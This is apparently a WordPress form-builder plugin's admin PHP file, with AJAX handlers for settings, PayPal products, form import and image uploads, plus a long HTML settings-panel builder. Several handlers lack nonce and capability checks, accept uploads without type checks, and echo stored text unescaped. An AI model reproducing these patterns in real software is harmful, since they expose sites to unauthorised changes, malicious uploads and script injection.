<?php
/***************************************/
/***********   Ajax Calls   ************/
/***************************************/

add_action('wp_ajax_get_lang_settings',  array('NEXForms_admin','get_lang_settings') );
add_action('wp_ajax_get_event_info',  array('NEXForms_admin','get_event_info') );
add_action('wp_ajax_get_events',  array('NEXForms_admin','NEXForms_get_events') );
add_action('wp_ajax_get_event_information',  array('NEXForms_admin','get_event_information') );
add_action('wp_ajax_load_nex_event_calendars',  array('NEXForms_admin','get_calendars') );
add_action('wp_ajax_load_templates',  array('NEXForms_admin','get_templates') );

add_action('wp_ajax_build_form_data_table', array('NEXForms_form_entries','build_form_data_table'));
add_action('wp_ajax_populate_form_data_list', array('NEXForms_form_entries','get_form_data'));
add_action( 'wp_ajax_do_upload_image', array('NEXForms_admin','do_upload_image'));
add_action( 'wp_ajax_do_upload_image_select', array('NEXForms_admin','do_upload_image_select'));


add_action( 'wp_ajax_save_email_config', array('NEXForms_admin','save_email_config'));
add_action( 'wp_ajax_save_script_config', array('NEXForms_admin','save_script_config'));
add_action( 'wp_ajax_do_form_import', array('NEXForms_admin','do_form_import'));
add_action( 'wp_ajax_save_style_config', array('NEXForms_admin','save_style_config'));
add_action( 'wp_ajax_save_other_config', array('NEXForms_admin','save_other_config'));

add_action( 'wp_ajax_buid_paypal_products', array('NEXForms_admin','buid_paypal_products'));


class NEXForms_admin{

	
	/***************************************/
	/*******   Customizing Forms   *********/
	/***************************************/
	
	
	public function buid_paypal_products(){
	
	global $wpdb;
	
	$get_result = $wpdb->get_var('SELECT products FROM '. $wpdb->prefix .'wap_nex_forms_paypal WHERE nex_forms_Id = '.filter_var($_POST['nex_forms_Id'],FILTER_SANITIZE_NUMBER_INT).' ');
	
	$products = explode('[end_product]',$get_result);
		$i=1;
		foreach($products as $product)
			{

				$item_name =  explode('[item_name]',$product);
				$item_name2 =  explode('[end_item_name]',$item_name[1]);
				
				
				$item_qty =  explode('[item_qty]',$product);
				$item_qty2 =  explode('[end_item_qty]',$item_qty[1]);
				
				$map_item_qty =  explode('[map_item_qty]',$product);
				$map_item_qty2 =  explode('[end_map_item_qty]',$map_item_qty[1]);
				
				$set_quantity =  explode('[set_quantity]',$product);
				$set_quantity2 =  explode('[end_set_quantity]',$set_quantity[1]);
				
				$item_amount =  explode('[item_amount]',$product);
				$item_amount2 =  explode('[end_item_amount]',$item_amount[1]);
				
				$map_item_amount =  explode('[map_item_amount]',$product);
				$map_item_amount2 =  explode('[end_map_item_amount]',$map_item_amount[1]);
				
				$set_amount =  explode('[set_amount]',$product);
				$set_amount2 =  explode('[end_set_amount]',$set_amount[1]);
				
				
				
				
			if($item_name2[0])
				{
				$output .= '<div class="row paypal_product">';		
					$output .= '<div class="row">';
						$output .= '<div class="panel panel-default">';
							$output .= '<div class="panel-heading"><span class="product_number">Item '.$i.'</span><div class="btn btn-default btn-sm remove_paypal_product"><span class="fa fa-trash-o"></span></div></div>';
							$output .= '<div class="panel-body">';
								
								$output .= '<input style="width:100% !important" placeholder="Item Name" name="item_name" class="form-control" value="'.$item_name2[0].'">';
							
								$output .= '<br><div class="pp_product_quantity">';
									$output .= '<label class="pp_product_label">Quantity</label>';
									$output .= '<div class="btn btn-sm btn-default static_value '.(($set_quantity2[0]=='static') ? 'active' : '').'">Static Value</div>';
									$output .= '<div class="btn btn-sm btn-default field_value '.(($set_quantity2[0]=='map') ? 'active' : '').'">Map Field</div>';
									$output .= '<input type="hidden" name="set_quantity" value="'.$set_quantity2[0].'">';
									$output .= '<input type="hidden" name="selected_qty_field" value="'.$map_item_qty2[0].'">';
									$output .= '<input value="'.$item_qty2[0].'"  type="text" style="width:100% !important" placeholder="Quantity" name="item_quantity" class="form-control '.(($set_quantity2[0]!='static') ? 'hidden' : '').'">';
									$output .= '<select name="map_item_quantity" class="form-control '.(($set_quantity2[0]=='static') ? 'hidden' : '').'"><option value="0">--- Map Field ---</option></select>';
								$output .= '</div>';
								
								$output .= '<br><div class="pp_product_amount">';
									$output .= '<label class="pp_product_amount">Amount</label>';
									$output .= '<div class="btn btn-sm btn-default static_value '.(($set_amount2[0]=='static') ? 'active' : '').'">Static Value</div>';
									$output .= '<div class="btn btn-sm btn-default field_value '.(($set_amount2[0]=='map') ? 'active' : '').'">Map Field</div>';
									$output .= '<input type="hidden" name="set_amount" value="'.$set_amount2[0].'">';
									$output .= '<input type="hidden" name="selected_amount_field" value="'.$map_item_amount2[0].'">';
									$output .= '<input  value="'.$item_amount2[0].'" type="text" style="width:100% !important" placeholder="Amount" name="item_amount" class="form-control '.(($set_amount2[0]=='map') ? 'hidden' : '').'">';
									$output .= '<select name="map_item_amount" class="form-control '.(($set_amount2[0]=='static') ? 'hidden' : '').'"><option value="0">--- Map Field ---</option></select>';
								$output .= '</div>';
							
							$output .= '</div>';
						$output .= '</div>';
					$output .= '</div>';
				$output .= '</div>';
				
				$i++;	
				}
			}	
		echo $output;
		die();
	}
	
	
	
	public function save_email_config() {
		
		update_option('nex-forms-email-config',array
			(
			'email_method'			=> filter_var($_POST['email_method'],FILTER_SANITIZE_STRING),
			'smtp_host' 			=> filter_var($_POST['smtp_host'],FILTER_SANITIZE_STRING),
			'mail_port' 			=> filter_var($_POST['mail_port'],FILTER_SANITIZE_NUMBER_INT),
			'email_smtp_secure' 	=> filter_var($_POST['email_smtp_secure'],FILTER_SANITIZE_STRING),
			'smtp_auth' 			=> filter_var($_POST['smtp_auth'],FILTER_SANITIZE_NUMBER_INT),
			'set_smtp_user' 		=> filter_var($_POST['set_smtp_user'],FILTER_SANITIZE_STRING),
			'set_smtp_pass' 		=> filter_var($_POST['set_smtp_pass'],FILTER_SANITIZE_STRING),
			'email_content' 		=> filter_var($_POST['email_content'],FILTER_SANITIZE_STRING)
			)
		
		);
		die();
	}
	
	public function save_script_config() {

		if(!array_key_exists('inc-jquery',$_POST))
			$_POST['inc-jquery'] = '0';
		if(!array_key_exists('inc-jquery-ui-core',$_POST))
			$_POST['inc-jquery-ui-core'] = '0';
		if(!array_key_exists('inc-jquery-ui-autocomplete',$_POST))
			$_POST['inc-jquery-ui-autocomplete'] = 0;
		if(!array_key_exists('inc-jquery-ui-slider',$_POST))
			$_POST['inc-jquery-ui-slider'] = 0;
		if(!array_key_exists('inc-jquery-form',$_POST))
			$_POST['inc-jquery-form'] = 0;
		if(!array_key_exists('inc-onload',$_POST))
			$_POST['inc-onload'] = 0;
		
		update_option('nex-forms-script-config',array
			(
			'inc-jquery' 					=> filter_var($_POST['inc-jquery'],FILTER_SANITIZE_NUMBER_INT),
			'inc-jquery-ui-core' 			=> filter_var($_POST['inc-jquery-ui-core'],FILTER_SANITIZE_NUMBER_INT),
			'inc-jquery-ui-autocomplete' 	=> filter_var($_POST['inc-jquery-ui-autocomplete'],FILTER_SANITIZE_NUMBER_INT),
			'inc-jquery-ui-slider' 			=> filter_var($_POST['inc-jquery-ui-slider'],FILTER_SANITIZE_NUMBER_INT),
			'inc-jquery-form' 				=> filter_var($_POST['inc-jquery-form'],FILTER_SANITIZE_NUMBER_INT),
			'inc-bootstrap' 				=> filter_var($_POST['inc-bootstrap'],FILTER_SANITIZE_NUMBER_INT),
			'inc-onload' 					=> filter_var($_POST['inc-onload'],FILTER_SANITIZE_NUMBER_INT)
			)
		);
		die();
	}
	
	public function do_form_import() {

		foreach($_FILES as $key=>$file)
			{
			$uploadedfile = $_FILES[$key];
			$upload_overrides = array( 'test_form' => false );
			$movefile = wp_handle_upload( $uploadedfile, $upload_overrides );
			//
			if ( $movefile ) {
				//echo "File is valid, and was successfully uploaded.\n";
					if($movefile['file'])
						{
						$set_file_name = str_replace(ABSPATH,'',$movefile['file']);
						$_POST['image_path'] = $movefile['url'];
						$_POST['image_name'] = $file['name'];
						$_POST['image_size'] = $file['size'];
						
						$url = $movefile['url'];
						$curl = curl_init();
						curl_setopt($curl, CURLOPT_URL, $url);
						curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
						curl_setopt($curl, CURLOPT_HEADER, false);
						$data = curl_exec($curl);
						
						
						echo str_replace('\\','',curl_exec($curl));
						curl_close($curl);
						}
			} 
			
		}
		die();
	}
	
	public function save_style_config() {

		if(!array_key_exists('incstyle-jquery',$_POST))
			$_POST['incstyle-jquery'] = '0';
		if(!array_key_exists('incstyle-font-awesome',$_POST))
			$_POST['incstyle-font-awesome'] = '0';
		if(!array_key_exists('incstyle-bootstrap',$_POST))
			$_POST['incstyle-bootstrap'] = '0';
		if(!array_key_exists('incstyle-jquery',$_POST))
			$_POST['incstyle-custom'] = '0';
		
		
		update_option('nex-forms-style-config',array
			(
			'incstyle-jquery' 		=> filter_var($_POST['incstyle-jquery'],FILTER_SANITIZE_NUMBER_INT),
			'incstyle-font-awesome' => filter_var($_POST['incstyle-font-awesome'],FILTER_SANITIZE_NUMBER_INT),
			'incstyle-bootstrap' 	=> filter_var($_POST['incstyle-bootstrap'],FILTER_SANITIZE_NUMBER_INT),
			'incstyle-custom' 		=> filter_var($_POST['incstyle-custom'],FILTER_SANITIZE_NUMBER_INT)
			)
		);
		die();
	}
	public function save_other_config() {
		
		if(!get_option('nex-forms-other-config'))
		{
		add_option('nex-forms-other-config',array(
				'enable-print-scripts'=>'1',
				'enable-print-styles'=>'1',
				'enable-tinymce'=>'1',
				'enable-widget'=>'1',
				'enable-color-adapt'=>'1',	
			));
		}
		if(!array_key_exists('enable-print-scripts',$_POST))
			$_POST['enable-print-scripts'] = '0';
		if(!array_key_exists('enable-print-styles',$_POST))
			$_POST['enable-print-styles'] = '0';
		if(!array_key_exists('enable-tinymce',$_POST))
			$_POST['enable-tinymce'] = '0';
		if(!array_key_exists('enable-widget',$_POST))
			$_POST['enable-widget'] = '0';
		if(!array_key_exists('enable-color-adapt',$_POST))
			$_POST['enable-color-adapt'] = '0';
		
		update_option('nex-forms-other-config',array
			(
			'enable-print-scripts' 		=> filter_var($_POST['enable-print-scripts'],FILTER_SANITIZE_NUMBER_INT),
			'enable-print-styles' 		=> filter_var($_POST['enable-print-styles'],FILTER_SANITIZE_NUMBER_INT),
			'enable-tinymce' 			=> filter_var($_POST['enable-tinymce'],FILTER_SANITIZE_NUMBER_INT),
			'enable-widget' 			=> filter_var($_POST['enable-widget'],FILTER_SANITIZE_NUMBER_INT),
			'enable-color-adapt' 		=> filter_var($_POST['enable-color-adapt'],FILTER_SANITIZE_NUMBER_INT)
			)
		);
		die();
	}
	
	
	public function do_upload_image_select() {
	
		/*print_r($_POST);
		print_r($_FILES);*/
	
		foreach($_FILES as $key=>$file)
			{
			$uploadedfile = $_FILES[$key];
			$upload_overrides = array( 'test_form' => false );
			$movefile = wp_handle_upload( $uploadedfile, $upload_overrides );
			//
			if ( $movefile ) {
				//echo "File is valid, and was successfully uploaded.\n";
					if($movefile['file'])
						{
						$set_file_name = str_replace(ABSPATH,'',$movefile['file']);
						$_POST['image_path'] = $movefile['url'];
						$_POST['image_name'] = $file['name'];
						$_POST['image_size'] = $file['size'];
						echo $movefile['url'];
						}
			} 
		}
		
		die();
	}
	public function do_upload_image() {

		foreach($_FILES as $key=>$file)
			{
			$uploadedfile = $_FILES[$key];
			$upload_overrides = array( 'test_form' => false );
			$movefile = wp_handle_upload( $uploadedfile, $upload_overrides );
			//
			if ( $movefile ) {
				//echo "File is valid, and was successfully uploaded.\n";
					if($movefile['file'])
						{
						$set_file_name = str_replace(ABSPATH,'',$movefile['file']);
						$_POST['image_path'] = $movefile['url'];
						$_POST['image_name'] = $file['name'];
						$_POST['image_size'] = $file['size'];
						echo $movefile['url'];
						}
			} 
		}
		
		die();
	}
	
	public function get_calendars(){
		global $wpdb;
		$get_calendars = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms WHERE is_template<>1 ORDER BY Id DESC');
		$calendars = $wpdb->get_results($get_calendars);
		//$i=1;
		
		

		
		foreach($calendars as $calendar)
			{
			$output .= '<div class="list-group-item" href="#" id="'.$calendar->Id.'">';
				$output .= '<span class="badge">'.IZC_Template::get_total_records('wap_nex_forms_entries','',$calendar->Id).'</span>&nbsp;&nbsp;<span class="calendar_title open_calendar">'.$calendar->title.'</span><br />';
				$output .= '<span class="calendar_description"><em><small style="color:#999; margin-left: 20px">'.$calendar->description.'</small></em></span>';
				$output .= '
				  <!--<button type="button" class="btn alert-success open_calendar" data-dismiss="modal" data-toggle="tooltip" data-placement="top" title="Open" id="'.$calendar->Id.'">&nbsp;<span class="fa fa-file"></span>&nbsp;</button>
				  <button type="button" class="btn alert-info duplicate_record" data-toggle="modal" data-toggle="tooltip" data-placement="top" title="Duplicate" id="'.$calendar->Id.'">&nbsp;<span class="fa fa-files-o"></span>&nbsp;</button>
				  <button type="button" class="btn alert-warning edit_the_calendar" data-toggle="modal" data-target="#editCalendar" data-toggle="tooltip" data-placement="top" title="Edit" id="'.$calendar->Id.'">&nbsp;<span class="fa fa-pencil"></span>&nbsp;</button>
				  <button type="button" class="btn alert-info embed_form" data-toggle="modal" data-target="#useForm" data-toggle="tooltip" data-placement="top" title="Use" id="'.$calendar->Id.'">&nbsp;<span class="fa fa-code"></span>&nbsp;</button>
				 --> 
				 <div class="form_actions">
					 <a class="btn btn-default bs-tooltip"  data-toggle="tooltip" data-placement="left" title="" data-original-title="Export"  href="'.get_option('siteurl').'/wp-admin/admin.php?page=nex-forms-main&nex_forms_Id='.$calendar->Id.'&export_form=true"><span class="fa fa-cloud-download bs-tooltip"  data-toggle="tooltip" data-placement="left" title="" data-original-title="Export"></span></a>
					 <button type="button" class="btn btn-default duplicate_record bs-tooltip" id="'.$calendar->Id.'" data-toggle="tooltip" data-placement="left" title="" data-original-title="Duplicate"><span class="fa fa-files-o"></span></button>
					 <button type="button" class="btn btn-default delete_the_calendar bs-tooltip" data-toggle="tooltip" data-placement="left" title="" data-original-title="Delete">&nbsp;<span class="fa fa-trash"></span>&nbsp;</button>
				 </div>
				';
			$output .= '<div class="do_permanent_delete">Delete permanently?&nbsp;<button id="'.$calendar->Id.'" class="btn btn-danger btn-xs  do_delete text-danger"><span class="fa fa-check  text-danger"></span></button>&nbsp;<button class="btn btn-xs btn-default dont_delete text-success"><span class="fa fa-close text-success"></span></button><br /></div>';

			$output .= '</div>';
			//$i++;
			}
			$output .= '<div class="scroll_spacer"></div>';
			//$output .= '<li id="'.$calendar->Id.'" class="nex_event_calendar"><a href="#"><span class="the_form_title">'.$calendar->title.'</span></a>&nbsp;&nbsp;<i class="fa fa-trash-o delete_the_calendar" data-toggle="modal" data-target="#deleteCalendar" id="'.$calendar->Id.'"></i></li>';	
		echo $output;
		die();
	}
	
	
	public function get_templates(){
		global $wpdb;
		$get_templates = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms WHERE is_template=1 ORDER BY Id DESC');
		$templates = $wpdb->get_results($get_templates);
		//$i=1;
		
		$output .= '<div class="form_holder_heading"><span class="fa fa-clipboard"></span>Form Templates</div>';

		
		foreach($templates as $template)
			{
			$output .= '<a class="list-group-item" href="#" id="'.$template->Id.'">';
				$output .= '<span class="fa fa-file-text"></span>&nbsp;&nbsp;<span class="calendar_title open_calendar">'.$template->title.'</span><br />';
				$output .= '<span class="calendar_description"><em><small style="color:#999; margin-left: 20px">'.$template->description.'</small></em></span>';
				$output .= '
				  <!--<button type="button" class="btn alert-success open_calendar" data-dismiss="modal" data-toggle="tooltip" data-placement="top" title="Open" id="'.$template->Id.'">&nbsp;<span class="fa fa-file"></span>&nbsp;</button>
				  <button type="button" class="btn alert-info duplicate_record" data-toggle="modal" data-toggle="tooltip" data-placement="top" title="Duplicate" id="'.$template->Id.'">&nbsp;<span class="fa fa-files-o"></span>&nbsp;</button>
				  <button type="button" class="btn alert-warning edit_the_calendar" data-toggle="modal" data-target="#editCalendar" data-toggle="tooltip" data-placement="top" title="Edit" id="'.$template->Id.'">&nbsp;<span class="fa fa-pencil"></span>&nbsp;</button>
				  <button type="button" class="btn alert-info embed_form" data-toggle="modal" data-target="#useForm" data-toggle="tooltip" data-placement="top" title="Use" id="'.$template->Id.'">&nbsp;<span class="fa fa-code"></span>&nbsp;</button>
				 --> 
				 <div class="form_actions"><button type="button" class="btn btn-default delete_the_calendar">&nbsp;<span class="fa fa-trash"></span>&nbsp;</button></div>
				';
			$output .= '<div class="do_permanent_delete">Delete permanently?&nbsp;<button id="'.$template->Id.'" class="btn btn-danger btn-xs  do_delete text-danger"><span class="fa fa-check  text-danger"></span></button>&nbsp;<button class="btn btn-xs btn-default dont_delete text-success"><span class="fa fa-close text-success"></span></button><br /></div>';

			$output .= '</a>';
			//$i++;
			}
			$output .= '<div class="scroll_spacer"></div>';
			//$output .= '<li id="'.$calendar->Id.'" class="nex_event_calendar"><a href="#"><span class="the_form_title">'.$calendar->title.'</span></a>&nbsp;&nbsp;<i class="fa fa-trash-o delete_the_calendar" data-toggle="modal" data-target="#deleteCalendar" id="'.$calendar->Id.'"></i></li>';	
		echo $output;
		die();
	}
	
	public function NEXForms_field_settings()
		{
		do_action( 'styles_font_menu' );
		/*if(is_rtl())
			wp_enqueue_style('nex-forms-rtl', plugins_url('/css/rtl.css',plugins_url('',dirname(__FILE__));*/

		
		//ICON SET				
		$output .= '<div class="modal iconSet" data-backdrop="false"  id="iconSet" data-show="true" style="z-index:10000 !important;">';
			$output .= '<div class="modal-dialog">';
				$output .= '<div class="modal-content">';
					$output .= '<div class="modal-header">';
						$output .= '<button type="button btn-lg" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>';
						//$output .= '<h4 class="modal-title" id="myModalLabel">Icon Set</h4>';
						$output .= '<div class="row"><div class="col-sm-12"><input id="icon_search" name="icon_search" type="text" class="icon_search form-control" placeholder="Search Icons"></div></div>';
					$output .= '</div>';
					
					$output .= '<div class="modal-body">'; 
						$output .= NEXForms_admin::show_icons();
					$output .= '</div>';
					
				$output .= '<div class="modal-footer align_center">
								<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
							  </div></div>';
			$output .= '</div>';
		$output .= '</div>';
		
		
		$output .= '<form enctype="multipart/form-data" method="post" action="'.get_option('siteurl').'/wp-admin/admin-ajax.php" id="do_upload_image_selection" name="do_upload_image_selection" style="display:none;">
								<div data-provides="fileinput" class="fileinput fileinput-new hidden">
																		  <div style="width: 100px; height: 100px;" data-trigger="fileinput" class="the_input_element fileinput-preview thumbnail"></div>
																		  <div>
																			<span data-placement="top" data-secondary-message="Invalid image extension" data-content="Please select an image" class="btn btn-default btn-file the_input_element error_message"><span class="fileinput-new">Select image</span><span class="fileinput-exists">Change</span>
																			<input type="file" name="do_image_select_upload_preview">
																			</span>
																			<a data-dismiss="fileinput" class="btn btn-default fileinput-exists" href="#">Remove</a>
																		  </div>
																		  <div style="display:none;" class="get_file_ext">gif
jpg
jpeg
png
psd
tif
tiff</div></div></form><div id="nex-forms-field-settings" class="nex-forms-field-settings slide_in_right bs-callout bs-callout-info bootstro" data-bootstro-title="Editing Panel" data-bootstro-content="This is where you will edit all available settings for form elements. This panel will slide open on adding a new field or by clicking on a specific element\'s attributes: the label, the input or the help text. The current element is highlighted by a green dotted border (see the text field label to your left)<br /><br /> Note that different fields have different validation and input settings." data-bootstro-placement="left" data-bootstro-step="17">';
					$output .= '<a class="close_slide_in_right"><span class="fa fa-close"></span></a>';
					$output .= '<div class="current_id hidden" ></div>';
					if(is_rtl())
						$output .= '<div class="is_rtl hidden" >true</div>';
					else
						$output .= '<div class="is_rtl hidden" >false</div>';
					
					$output .= '<div class="blogname hidden" >'.get_option('blogname').'</div>';
					$output .= '<div class="admin_email hidden" >'.get_option('admin_email').'</div>';
						$output .= '<div class="">';
							$output .= '<div class="">';
								$output .= '<h4 class="">';									
									$output .= '<span class="fa fa-edit"></span>&nbsp;Edit Field&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="btn btn-default btn-sm copy-field bs-tooltip" title="Duplicate field" data-placement="right" data-toggle="tooltip"><span class="fa fa-files-o"></span></span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="btn btn-default btn-sm delete-field bs-tooltip" title="Delete field" data-placement="right" data-toggle="tooltip"><span class="fa fa-trash-o"></span></span>';
								$output .= '</h4>';
							$output .= '</div>';
							$output .= '<div>';
								$output .= '<div class="">';
									$output .= '<div class="clearfix" id="options">
													  <ul data-option-key="filter" class="option-set  nav nav-tabs clearfix" id="filters">
														<li class="active bootstro" data-bootstro-title="Label settings" data-bootstro-content="Label settings are mostly the same for elements and contains: Label text and color, sublabel text and color, label position (top, left, hidden), text alignment (left, center, right), font style with over 1400 fonts to choose from and label size" data-bootstro-placement="right" data-bootstro-step="18"><a class="the-label" data-option-value=".settings-label" href="#filter">Label</a></li>
														<li class="bootstro" data-bootstro-title="Input settings" data-bootstro-content="These setting differ for each type of field and are focused on the input element itself" data-bootstro-placement="right" data-bootstro-step="19"><a class="input-element" data-option-value=".settings-input" href="#filter">Input</a></li>
														<li class="bootstro" data-bootstro-title="Help text settings" data-bootstro-content="Help text settings are mostly the same for elements and contains: the help text and color, position (tooltip, bottom or hidden), alignment (left,center,right), font style with over 1400 fonts to choose from and text size" data-bootstro-placement="right" data-bootstro-step="20"><a class="help-text" data-option-value=".settings-help-text" href="#filter">Help Block</a></li>
														<li class="bootstro" data-bootstro-title="Validation settings" data-bootstro-content="Validation settings are also mostly the same for elements and contains: required (yes, no), required indicator(full star, empty star, asterisk), position to popup (top, right, bottom, left) and the error message to be displayed. Text and custom fields will contain extra validation settings namely: maximum characters, and format vaidation (email, url, number, digists only, text only)" data-bootstro-placement="bottom" data-bootstro-step="21" ><a class="validation" data-option-value=".settings-validation" href="#filter">Validation</a></li>
														<li><a class="logic" data-option-value=".settings-logic" href="#filter">Logic</a></li>
														<li><a class="math_logic" data-option-value=".settings-math-logic" href="#filter">Math Logic</a></li>
													  </ul>
												  </div>';
									
									$output .= '<div id="field-settings-inner">';
                  						$output .= '<div class="clearfix row categorize_it" id="categorize_it_container" style="position: relative; height: 606px;">';

/******************************************************************************************************************************/
//Conditional Logic             							 
$output .= '<div class="row">';
	$output .= '<div class="col-sm-12 settings-logic" style="z-index:1000005 !important;">';
		$output .= '<button class="add_condition btn btn-primary form-control" style="margin-bottom:15px; !important"><span class="fa fa-gear">&nbsp;</span> Add Condition</button>';
		$output .= '<div class="input_holder field_condition_template hidden">';
			
			$output .= '<div class="row">';
				$output .= '<div class="col-xs-4">';
					$output .= '<label>If this field\'s value is <em class="setcondition"></em></label>';
				$output .= '</div>';
				$output .= '<div class="col-xs-3">';
					$output .= '<label>Action <em class="setaction"></em></label>';
				$output .= '</div>';
				$output .= '<div class="col-xs-3">';
					$output .= '<label>Target<em class="targetname"></em></label>';
				$output .= '</div>';
				$output .= '<div class="col-xs-2">';
				$output .= '</div>';
				
			$output .= '</div>';
			$output .= '<div class="row">';
				$output .= '<div class="col-xs-4">';
					$output .= '<div class="input-group">
								  <div class="input-group-btn">
									<button data-toggle="dropdown" class="btn btn-default dropdown-toggle" type="button" style="height:20px"><span class="caret"></span></button>
									<ul role="menu" class="dropdown-menu set_conditional_action">
									  <li><a href="#">Equal to</a></li>
									  <li><a href="#">Greater than</a></li>
									  <li><a href="#">Less than</a></li>
									</ul>
								  </div><!-- /btn-group -->
								  <input type="text" class="form-control" name="set_conditional_value">
								</div><!-- /input-group -->
								';
				$output .= '</div>';
				
				$output .= '<div class="col-xs-3">';		
					$output .= '<select class="form-control" name="con_action"><option value="show">Show</option><option value="hide">Hide</option></select>';
				$output .= '</div>';
				$output .= '<div class="col-xs-3">';	
					$output .= '<div class="dropdown"><button class="btn btn-primary dropdown-toggle make_con_selection" type="button" id="dropdownMenu1" data-toggle="dropdown" aria-expanded="true">Select Target </button><ul class="dropdown-menu" role="menu" aria-labelledby="dropdownMenu1"><li><a href="#" class="target_field target_type_field">Select Field</a></li><li role="presentation"><a role="menuitem" tabindex="-1" href="#" class="target_field target_type_panel">Select Panel</a></li></ul></div>';
				$output .= '</div>';
				
				$output .= '<div class="col-xs-2">';	
					$output .= '<button class="btn btn-danger form-control remove_condition"><span class="glyphicon glyphicon-remove"></span></button>';
				$output .= '</div>';
			$output .= '</div>';
		$output .= '</div>';
	$output .= '</div>';
$output .= '</div>';



/******************************************************************************************************************************/
//PREFIX             							 
											//text
											$output .= '<div class="row">';
											
											$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden setting-md-input">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Choose Effect</label>';
														$output .= '<select name="md-effect" class="form-control">
																		<option value="haruki">Haruki</option>
																		<option value="hoshi">Hoshi</option>
																		<option value="jiro">Jiro</option>
																		<!--<option value="kaede">Kaede</option>-->
																		<option value="nariko">Nariko</option>
																		<option value="ruri">Ruri</option>
																		
																	</select>
														';
													$output .= '</div>';
												$output .= '</div>';
											
											$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden setting-md-select">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Choose Effect</label>';
														$output .= '<select name="md-select-effect" class="form-control">
																		<option value="default" selected="selected">Default</option>
																		<option value="stack">Stack</option>
																		<option value="slide-in">Slide In</option>
																		<option value="angled">Random Angled</option>
																		<option value="fanned">Fan Out</option>
																		
																	</select>
														';
													$output .= '</div>';
												$output .= '</div>';
											
											$output .= '<div class="row">';
											$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-all">';
													$output .= '<div class="input_holder ">';											
														$output .= '<label>Input Name</label>';
														$output .= '<input id="set_input_name" type="text" name="set_input_name" class="form-control">';
													$output .= '</div>';
												$output .= '</div>';
																				
											
											
                  
/******************************************************************************************************************************/
//LABEL SETTINGS                							 
											//text
											
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden setting-md-label settings-label categorize_it-item no-transition">';
													$output .= '<div class="input_holder ">';					
														$output .= '<label>Text</label>';
														$output .= '<div class="input-group input-group-sm">';
															$output .= '<input id="set_label" type="text" name="set_label" class="form-control">';
														    $output .= '<span class="input-group-addon label-bold label-primary"><span class="glyphicon glyphicon-bold"></span></span>';
															$output .= '<span class="input-group-addon label-italic"><span class="glyphicon glyphicon-italic"></span></span>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden setting-md-label  settings-label categorize_it-item no-transition">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Color</label>';
														$output .= '<div id="label-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#000000" class="form-control" />
																		<span class="input-group-addon reset" data-default="#000000"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
											
											//Subtext
											$output .= '<div class="row">';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-label categorize_it-item no-transition">';
													$output .= '<div class="input_holder ">';											
														$output .= '<label></label>';
														$output .= '<div class="input-group input-group-sm">';
															$output .= '<input id="set_subtext" type="text" name="set_subtext" class="form-control">';
														    $output .= '<span class="input-group-addon sub-label-bold"><span class="glyphicon glyphicon-bold"></span></span>';
															$output .= '<span class="input-group-addon sub-label-italic label-primary"><span class="glyphicon glyphicon-italic"></span></span>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-label categorize_it-item no-transition">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Color</label>';
															$output .= '<div id="label-subtext" class="input-group input-group-sm colorpicker-component demo demo-auto">
																	<span class="input-group-addon"><i></i></span>
																	<input type="text" value="#999999" class="form-control" />
																	<span class="input-group-addon reset" data-default="#999999"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';	
											
											//Position / alingment
											$output .= '<div class="row">';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-label categorize_it-item no-transition">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Position</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  show-label">
																		<button class="btn btn-default  left" type="button"><span class="glyphicon glyphicon-arrow-left"></span>&nbsp;&nbsp;Left</button>
																		<button class="btn btn-default  top" type="button"><span class="glyphicon glyphicon-arrow-up"></span>&nbsp;&nbsp;Top</button>
																		<button class="btn btn-default  none" type="button"><span class=" fa fa-eye-slash"></span>&nbsp;&nbsp;Hide</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden setting-md-label settings-label categorize_it-item no-transition">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Text Alignment</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  align-label">
																		<button class="btn btn-default left" type="button"><span class="glyphicon glyphicon-align-left"></span>&nbsp;&nbsp;Left</button>
																		<button class="btn btn-default center" type="button"><span class="glyphicon glyphicon-align-center"></span>&nbsp;&nbsp;Center</button>
																		<button class="btn btn-default right" type="button"><span class="glyphicon glyphicon-align-right"></span>&nbsp;&nbsp;Right</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
											
											
											//Font / Size
											$output .= '<div class="row">';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-label categorize_it-item no-transition">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Size</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
